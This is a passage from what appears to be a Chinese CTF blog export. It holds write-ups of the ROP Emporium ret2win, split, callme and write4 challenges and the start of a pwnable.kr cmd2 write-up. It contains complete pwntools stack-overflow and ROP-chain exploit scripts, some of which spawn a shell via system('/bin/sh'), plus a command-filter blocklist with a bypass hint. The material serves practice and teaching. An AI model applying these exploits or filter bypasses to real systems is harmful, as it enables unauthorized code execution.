0LL);</span><br><span class="line">  puts(&quot;ret2win by ROP Emporium&quot;);</span><br><span class="line">  puts(&quot;64bits\n&quot;);</span><br><span class="line">  pwnme();</span><br><span class="line">  puts(&quot;\nExiting&quot;);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------</span><br><span class="line">char *pwnme()</span><br><span class="line">&#123;</span><br><span class="line">  char s; &#x2F;&#x2F; [rsp+0h] [rbp-20h]</span><br><span class="line"></span><br><span class="line">  memset(&amp;s, 0, 0x20uLL);</span><br><span class="line">  puts(</span><br><span class="line">    &quot;For my first trick, I will attempt to fit 50 bytes of user input into 32 bytes of stack buffer;\n&quot;</span><br><span class="line">    &quot;What could possibly go wrong?&quot;);</span><br><span class="line">  puts(&quot;You there madam, may I have your input please? And don&#39;t worry about null bytes, we&#39;re using fgets!\n&quot;);</span><br><span class="line">  printf(&quot;&gt; &quot;, 0LL);</span><br><span class="line">  return fgets(&amp;s, 50, stdin);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">---------------------------------------------------------------</span><br><span class="line">int ret2win()</span><br><span class="line">&#123;</span><br><span class="line">  printf(&quot;Thank you! Here&#39;s your flag:&quot;);</span><br><span class="line">  return system(&quot;&#x2F;bin&#x2F;cat flag.txt&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于没有其余参数，所以无差</p><p>exp如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">'linux'</span>,arch=<span class="string">'amd64'</span>,log_level=<span class="string">'debug'</span>)</span><br><span class="line">ret_addr = <span class="number">0x400811</span></span><br><span class="line">payload = <span class="string">'a'</span>*(<span class="number">0x20</span>+<span class="number">8</span>)+p64(ret_addr)</span><br><span class="line">p = process(<span class="string">'./ret2win'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2><span id="psplit">split</span><a href="#psplit" class="header-anchor">#</a></h2><h3><span id="px86">x86</span><a href="#px86" class="header-anchor">#</a></h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ubuntu@VM-0-3-ubuntu:~/rop_emporium_all_challenges/split$ checksec split32</span><br><span class="line">[*] '/home/ubuntu/rop_emporium_all_challenges/split/split32'</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">ubuntu@VM-0-3-ubuntu:~/rop_emporium_all_challenges/split$ rabin2 -z split32</span><br><span class="line">[strings]</span><br><span class="line">addr=0x080486f0 off=0x000006f0 ordinal=000 sz=22 section=.rodata string=split by ROP Emporium</span><br><span class="line">addr=0x08048706 off=0x00000706 ordinal=001 sz=7 section=.rodata string=32bits</span><br><span class="line">addr=0x0804870f off=0x0000070f ordinal=002 sz=8 section=.rodata string=Exiting</span><br><span class="line">addr=0x08048718 off=0x00000718 ordinal=003 sz=44 section=.rodata string=Contriving a reason to ask user for data...</span><br><span class="line">addr=0x08048744 off=0x00000744 ordinal=004 sz=3 section=.rodata string=&gt; </span><br><span class="line">addr=0x08048747 off=0x00000747 ordinal=005 sz=8 section=.rodata string=/bin/ls</span><br><span class="line">addr=0x0804a030 off=0x00001030 ordinal=000 sz=18 section=.data string=/bin/cat flag.txt</span><br><span class="line"></span><br><span class="line">7 strings</span><br></pre></td></tr></table></figure><p>IDA看下代码</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">pwnme</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+0h] [ebp-28h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x20</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Contriving a reason to ask user for data..."</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"&gt; "</span>);</span><br><span class="line">  <span class="keyword">return</span> fgets(&amp;s, <span class="number">96</span>, <span class="built_in">stdin</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">-----------------------------------------------------------------</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">usefulFunction</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">"/bin/ls"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>显然就是ROP，调用system，传入<code>/bin/cat flag.txt</code>字符串地址了</p><p>exp如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">'linux'</span>,arch=<span class="string">'i386'</span>,log_level=<span class="string">'debug'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./split32'</span>)</span><br><span class="line">p = process(<span class="string">'./split32'</span>)</span><br><span class="line">sys_plt = elf.symbols[<span class="string">'system'</span>]</span><br><span class="line">payload = <span class="string">'a'</span>*(<span class="number">0x28</span>+<span class="number">4</span>)+p32(sys_plt)+p32(<span class="number">0xdeadbeaf</span>)+p32(<span class="number">0x0804a030</span>)</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3><span id="px64">x64</span><a href="#px64" class="header-anchor">#</a></h3><p>只有一个传参的区别，找一下gadget</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ubuntu@VM-0-3-ubuntu:~/rop_emporium_all_challenges/split$ rabin2 -z split</span><br><span class="line">[strings]</span><br><span class="line">addr=0x004008a8 off=0x000008a8 ordinal=000 sz=22 section=.rodata string=split by ROP Emporium</span><br><span class="line">addr=0x004008be off=0x000008be ordinal=001 sz=7 section=.rodata string=64bits</span><br><span class="line">addr=0x004008c7 off=0x000008c7 ordinal=002 sz=8 section=.rodata string=Exiting</span><br><span class="line">addr=0x004008d0 off=0x000008d0 ordinal=003 sz=44 section=.rodata string=Contriving a reason to ask user for data...</span><br><span class="line">addr=0x004008fc off=0x000008fc ordinal=004 sz=3 section=.rodata string=&gt; </span><br><span class="line">addr=0x004008ff off=0x000008ff ordinal=005 sz=8 section=.rodata string=/bin/ls</span><br><span class="line">addr=0x00601060 off=0x00001060 ordinal=000 sz=18 section=.data string=/bin/cat flag.txt</span><br><span class="line">ubuntu@VM-0-3-ubuntu:~/rop_emporium_all_challenges/split$ ROPgadget --binary split --only "pop|ret" | grep "rdi"</span><br><span class="line">0x0000000000400883 : pop rdi ; ret</span><br></pre></td></tr></table></figure><p>IDA看下：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">pwnme</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+0h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x20</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Contriving a reason to ask user for data..."</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"&gt; "</span>, <span class="number">0L</span>L);</span><br><span class="line">  <span class="keyword">return</span> fgets(&amp;s, <span class="number">96</span>, <span class="built_in">stdin</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>exp如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">'linux'</span>,arch=<span class="string">'amd64'</span>,log_level=<span class="string">'debug'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./split'</span>)</span><br><span class="line">p = process(<span class="string">'./split'</span>)</span><br><span class="line">sys_plt = elf.symbols[<span class="string">'system'</span>]</span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000400883</span></span><br><span class="line">string_addr = <span class="number">0x601060</span></span><br><span class="line">payload = <span class="string">'a'</span>*(<span class="number">0x20</span>+<span class="number">8</span>)+p64(pop_rdi_ret)+p64(string_addr)+p64(sys_plt)</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2><span id="pcallme">callme</span><a href="#pcallme" class="header-anchor">#</a></h2><h3><span id="px86">x86</span><a href="#px86" class="header-anchor">#</a></h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ubuntu@VM-0-3-ubuntu:~/rop_emporium_all_challenges/callme$ checksec callme32 </span><br><span class="line">[*] '/home/ubuntu/rop_emporium_all_challenges/callme/callme32'</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>用IDA查看下</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">pwnme</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+0h] [ebp-28h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x20</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Hope you read the instructions..."</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"&gt; "</span>);</span><br><span class="line">  <span class="keyword">return</span> fgets(&amp;s, <span class="number">256</span>, <span class="built_in">stdin</span>);</span><br><span class="line">&#125;</span><br><span class="line">--------------------------------------------------------------</span><br><span class="line"><span class="function"><span class="keyword">void</span> __noreturn <span class="title">usefulFunction</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  callme_three(<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>);</span><br><span class="line">  callme_two(<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>);</span><br><span class="line">  callme_one(<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看了下，应该是构造ROP，分别调用<code>callme_one</code>,<code>callme_two</code>,<code>callme_three</code>，在<code>.so</code>文件中看到都是三个参数，得是1,2,3。所以为了维持栈平衡，需要找pop三次ret的gadget。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ubuntu@VM-0-3-ubuntu:~/rop_emporium_all_challenges/callme$ ROPgadget --binary callme32 --only 'pop|ret' </span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x080488ab : pop ebp ; ret</span><br><span class="line">0x080488a8 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x08048579 : pop ebx ; ret</span><br><span class="line">0x080488aa : pop edi ; pop ebp ; ret</span><br><span class="line">0x080488a9 : pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x08048562 : ret</span><br><span class="line">0x080486be : ret 0xeac1</span><br></pre></td></tr></table></figure><p>所以找到了gadget地址<code>0x080488a9</code></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">'linux'</span>,arch=<span class="string">'i386'</span>,log_level=<span class="string">'debug'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./callme32'</span>)</span><br><span class="line">p = process(<span class="string">'./callme32'</span>)</span><br><span class="line">callme_one = elf.symbols[<span class="string">'callme_one'</span>]</span><br><span class="line">callme_two = elf.symbols[<span class="string">'callme_two'</span>]</span><br><span class="line">callme_three = elf.symbols[<span class="string">'callme_three'</span>]</span><br><span class="line">pop_pop_pop_ret = <span class="number">0x080488a9</span> </span><br><span class="line">payload = <span class="string">'a'</span>*(<span class="number">0x28</span>+<span class="number">4</span>)</span><br><span class="line">payload += p32(callme_one)+p32(pop_pop_pop_ret)+p32(<span class="number">1</span>)+p32(<span class="number">2</span>)+p32(<span class="number">3</span>)</span><br><span class="line">payload += p32(callme_two)+p32(pop_pop_pop_ret)+p32(<span class="number">1</span>)+p32(<span class="number">2</span>)+p32(<span class="number">3</span>)</span><br><span class="line">payload += p32(callme_three)+p32(pop_pop_pop_ret)+p32(<span class="number">1</span>)+p32(<span class="number">2</span>)+p32(<span class="number">3</span>)</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3><span id="px64">x64</span><a href="#px64" class="header-anchor">#</a></h3><p>同上，只是参数传递不同，三个参数分别用<code>rdi、rsi、rdx</code>传递，所以找gadget</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ubuntu@VM-0-3-ubuntu:~/rop_emporium_all_challenges/callme/callme$ ROPgadget --binary callme --only 'pop|ret' </span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x0000000000401b1c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000401b1e : pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000401b20 : pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000401b22 : pop r15 ; ret</span><br><span class="line">0x0000000000401b1b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000401b1f : pop rbp ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000401900 : pop rbp ; ret</span><br><span class="line">0x0000000000401ab0 : pop rdi ; pop rsi ; pop rdx ; ret</span><br><span class="line">0x0000000000401b23 : pop rdi ; ret</span><br><span class="line">0x0000000000401ab2 : pop rdx ; ret</span><br><span class="line">0x0000000000401b21 : pop rsi ; pop r15 ; ret</span><br><span class="line">0x0000000000401ab1 : pop rsi ; pop rdx ; ret</span><br><span class="line">0x0000000000401b1d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004017d9 : ret</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 14</span><br></pre></td></tr></table></figure><p>找到gadget地址<code>0x0000000000401ab0</code><br>构造exp如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">'linux'</span>,arch=<span class="string">'amd64'</span>,log_level=<span class="string">'debug'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./callme'</span>)</span><br><span class="line">p = process(<span class="string">'./callme'</span>)</span><br><span class="line">callme_one = elf.symbols[<span class="string">'callme_one'</span>]</span><br><span class="line">callme_two = elf.symbols[<span class="string">'callme_two'</span>]</span><br><span class="line">callme_three = elf.symbols[<span class="string">'callme_three'</span>]</span><br><span class="line">pop_pop_pop_ret = <span class="number">0x401ab0</span></span><br><span class="line">payload = <span class="string">'a'</span>*(<span class="number">0x20</span>+<span class="number">8</span>)</span><br><span class="line">payload += p64(pop_pop_pop_ret)+p64(<span class="number">1</span>)+p64(<span class="number">2</span>)+p64(<span class="number">3</span>)+p64(callme_one)</span><br><span class="line">payload += p64(pop_pop_pop_ret)+p64(<span class="number">1</span>)+p64(<span class="number">2</span>)+p64(<span class="number">3</span>)+p64(callme_two)</span><br><span class="line">payload += p64(pop_pop_pop_ret)+p64(<span class="number">1</span>)+p64(<span class="number">2</span>)+p64(<span class="number">3</span>)+p64(callme_three)</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2><span id="pwrite4">write4</span><a href="#pwrite4" class="header-anchor">#</a></h2><p>考察任意地址写，举例如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pop r1 </span><br><span class="line">pop r2 </span><br><span class="line">ret;（r1存地址，r2存信息）</span><br><span class="line">mov ptr [r1], r2 </span><br><span class="line">ret;（将r2的内容存入r1指向的地址）</span><br></pre></td></tr></table></figure><h3><span id="px86">x86</span><a href="#px86" class="header-anchor">#</a></h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ubuntu@VM-0-3-ubuntu:~/rop_emporium_all_challenges/write4$ checksec write432</span><br><span class="line">[*] '/home/ubuntu/rop_emporium_all_challenges/write4/write432'</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">ubuntu@VM-0-3-ubuntu:~/rop_emporium_all_challenges/write4$ rabin2 -z write432</span><br><span class="line">[strings]</span><br><span class="line">addr=0x08048700 off=0x00000700 ordinal=000 sz=23 section=.rodata string=write4 by ROP Emporium</span><br><span class="line">addr=0x08048717 off=0x00000717 ordinal=001 sz=7 section=.rodata string=32bits</span><br><span class="line">addr=0x08048720 off=0x00000720 ordinal=002 sz=8 section=.rodata string=Exiting</span><br><span class="line">addr=0x08048728 off=0x00000728 ordinal=003 sz=41 section=.rodata string=Go ahead and give me the string already!</span><br><span class="line">addr=0x08048751 off=0x00000751 ordinal=004 sz=3 section=.rodata string=&gt; </span><br><span class="line">addr=0x08048754 off=0x00000754 ordinal=005 sz=8 section=.rodata string=/bin/ls</span><br><span class="line"></span><br><span class="line">6 strings</span><br></pre></td></tr></table></figure><p>用IDA看下</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">pwnme</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+0h] [ebp-28h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x20</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Go ahead and give me the string already!"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"&gt; "</span>);</span><br><span class="line">  <span class="keyword">return</span> fgets(&amp;s, <span class="number">512</span>, <span class="built_in">stdin</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">-----------------------------------------------------------------------</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">usefulFunction</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">"/bin/ls"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>有system，但是字符串不是我们想要的，如果可以改成调用<code>system('/bin/sh')</code>就好了，所以需要我们自己写入这个字符串。找一下任意地址写的gadget</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ubuntu@VM-0-3-ubuntu:~/rop_emporium_all_challenges/write4$ ROPgadget --binary write432 --only "mov|pop|ret"</span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x08048547 : mov al, byte ptr [0xc9010804] ; ret</span><br><span class="line">0x08048670 : mov dword ptr [edi], ebp ; ret</span><br><span class="line">0x080484b0 : mov ebx, dword ptr [esp] ; ret</span><br><span class="line">0x080486db : pop ebp ; ret</span><br><span class="line">0x080486d8 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x080483e1 : pop ebx ; ret</span><br><span class="line">0x080486da : pop edi ; pop ebp ; ret</span><br><span class="line">0x080486d9 : pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x0804819d : ret</span><br><span class="line">0x080484fe : ret 0xeac1</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 10</span><br></pre></td></tr></table></figure><p>看到地址<code>0x080486da</code>、<code>0x08048670</code>两条gadget满足需求。同时x86系统一次只能写入4个字节，故需要将字符串拆分 成两次分别写入<code>.data</code>段</p><p>构造exp如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(os &#x3D; &#39;linux&#39;,arch &#x3D; &#39;i386&#39;, log_level &#x3D; &#39;debug&#39;)</span><br><span class="line">elf &#x3D; ELF(&#39;.&#x2F;write432&#39;)</span><br><span class="line">p &#x3D; process(&#39;.&#x2F;write432&#39;)</span><br><span class="line">pop_edi_pop_ebp_ret&#x3D;0x080486da</span><br><span class="line">mov_ptredi_ebp_ret&#x3D;0x08048670</span><br><span class="line">data_addr &#x3D; 0x0804a028 </span><br><span class="line">payload &#x3D; &#39;a&#39;*(0x28+4)</span><br><span class="line">payload +&#x3D; p32(pop_edi_pop_ebp_ret)</span><br><span class="line">payload +&#x3D; p32(data_addr)+&#39;&#x2F;bin&#39;</span><br><span class="line">payload +&#x3D; p32(mov_ptredi_ebp_ret)</span><br><span class="line">payload +&#x3D; p32(pop_edi_pop_ebp_ret)</span><br><span class="line">payload +&#x3D; p32(data_addr+4)+&#39;&#x2F;sh\x00&#39;</span><br><span class="line">payload +&#x3D; p32(mov_ptredi_ebp_ret)</span><br><span class="line">payload +&#x3D; p32(elf.symbols[&#39;system&#39;])+p32(0xdeadbeaf)+p32(data_addr)</span><br><span class="line">p.recvuntil(&#39;&gt;&#39;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3><span id="px64">x64</span><a href="#px64" class="header-anchor">#</a></h3><p>区别在于传参，同时字符串<code>/bin/sh</code>只需要一次就可以完全写入<br>找下gadget</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ubuntu@VM-0-3-ubuntu:~&#x2F;rop_emporium_all_challenges&#x2F;write4$ ROPgadget --binary write4 --only &quot;mov|pop|ret&quot;</span><br><span class="line">Gadgets information</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">0x0000000000400713 : mov byte ptr [rip + 0x20096e], 1 ; ret</span><br><span class="line">0x0000000000400821 : mov dword ptr [rsi], edi ; ret</span><br><span class="line">0x00000000004007ae : mov eax, 0 ; pop rbp ; ret</span><br><span class="line">0x0000000000400820 : mov qword ptr [r14], r15 ; ret</span><br><span class="line">0x000000000040088c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x000000000040088e : pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400890 : pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400892 : pop r15 ; ret</span><br><span class="line">0x0000000000400712 : pop rbp ; mov byte ptr [rip + 0x20096e], 1 ; ret</span><br><span class="line">0x000000000040088b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x000000000040088f : pop rbp ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004006b0 : pop rbp ; ret</span><br><span class="line">0x0000000000400893 : pop rdi ; ret</span><br><span class="line">0x0000000000400891 : pop rsi ; pop r15 ; ret</span><br><span class="line">0x000000000040088d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004005b9 : ret</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 16</span><br></pre></td></tr></table></figure><p>可以看到<code>0x0000000000400820</code>与<code>0x0000000000400890</code>处的gadget满足要求</p><p>构造exp如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(os &#x3D; &#39;linux&#39;,arch &#x3D; &#39;amd64&#39;, log_level&#x3D;&#39;debug&#39;)</span><br><span class="line">elf &#x3D; ELF(&#39;.&#x2F;write4&#39;)</span><br><span class="line">p &#x3D; process(&#39;.&#x2F;write4&#39;)</span><br><span class="line">data_addr &#x3D; 0x0000000000601050</span><br><span class="line">pop_r14_pop_r15_ret &#x3D; 0x0000000000400890</span><br><span class="line">mov_ptrr14_r15_ret &#x3D; 0x0000000000400820</span><br><span class="line">pop_rdi_ret &#x3D; 0x0000000000400893</span><br><span class="line">payload &#x3D; &#39;a&#39;*(0x20+8)</span><br><span class="line">payload +&#x3D; p64(pop_r14_pop_r15_ret)</span><br><span class="line">payload +&#x3D; p64(data_addr)</span><br><span class="line">payload +&#x3D; &#39;&#x2F;bin&#x2F;sh\x00&#39;</span><br><span class="line">payload +&#x3D; p64(mov_ptrr14_r15_ret)</span><br><span class="line">payload +&#x3D; p64(pop_rdi_ret)</span><br><span class="line">payload +&#x3D; p64(data_addr)</span><br><span class="line">payload +&#x3D; p64(elf.symbols[&#39;system&#39;])</span><br><span class="line">p.recvuntil(&#39;&gt;&#39;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>CTF</category>
        <category>pwn</category>
        <category>stack_overflow</category>
        <category>ROP_Emporium</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>pwn</tag>
        <tag>stack overflow</tag>
        <tag>ROP Emporium</tag>
      </tags>
  </entry>
  <entry>
    <title>pwnable.kr —— cmd2</title>
    <url>/bad1774.html</url>
    <content><![CDATA[<h2><span id="pquestion">question</span><a href="#pquestion" class="header-anchor">#</a></h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Daddy bought me a system command shell.</span><br><span class="line">but he put some filters to prevent me from playing with it without his permission...</span><br><span class="line">but I wanna play anytime I want!</span><br><span class="line"></span><br><span class="line">ssh cmd2@pwnable.kr -p2222 (pw:flag of cmd1)</span><br></pre></td></tr></table></figure><p>题目要求我们使用ssh登录到服务器上<code>ssh cmd2@pwnable.kr -p2222</code>，密码是cmd1的flag,有的时候可能有身份的校验，这个时候需要加上参数<code>-o StrictHostKeyChecking=no</code>进行登录</p><a id="more"></a><h2><span id="pcmd2-c">cmd2.c</span><a href="#pcmd2-c" class="header-anchor">#</a></h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">filter</span><span class="params">(<span class="keyword">char</span>* cmd)</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> r=<span class="number">0</span>;</span><br><span class="line">	r += <span class="built_in">strstr</span>(cmd, <span class="string">"="</span>)!=<span class="number">0</span>;</span><br><span class="line">	r += <span class="built_in">strstr</span>(cmd, <span class="string">"PATH"</span>)!=<span class="number">0</span>;</span><br><span class="line">	r += <span class="built_in">strstr</span>(cmd, <span class="string">"export"</span>)!=<span class="number">0</span>;</span><br><span class="line">	r += <span class="built_in">strstr</span>(cmd, <span class="string">"/"</span>)!=<span class="number">0</span>;</span><br><span class="line">	r += <span class="built_in">strstr</span>(cmd, <span class="string">"`"</span>)!=<span class="number">0</span>;</span><br><span class="line">	r += <span class="built_in">strstr</span>(cmd, <span class="string">"flag"</span>)!=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">return</span> r;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">char</span>** environ;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delete_env</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">char</span>** p;</span><br><span class="line">	<span class="keyword">for</span>(p=environ; *p; p++)	<span class="built_in">memset</span>(*p, <span class="number">0</span>, <span class="built_in">strlen</span>(*p));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[], <span class="keyword">char</span>** envp)</span></span>&#123;</span><br><span class="line">	delete_env();</span><br><span class="line">	putenv(<span class="string">"PATH=/no_command_execution_until_you_become_a_hacker"</span>);</span><br><span class="line">	<span class="keyword">if</span>(filter(argv[<span class="number">1</span>])) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"%s\n"</span>, argv[<span class="number">1</span>]);</span><br><span class="line">	system( argv[<span class="number">1</span>] );</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="panalyse">analyse</span><a href="#panalyse" class="header-anchor">#</a></h2><p>相对于cmd1，加强了过滤规则，主要是其中<code>/</code>的问题<br>可以在目录下使用<code>pwd</code>构造</p><p>其余的无差</p><h2><span 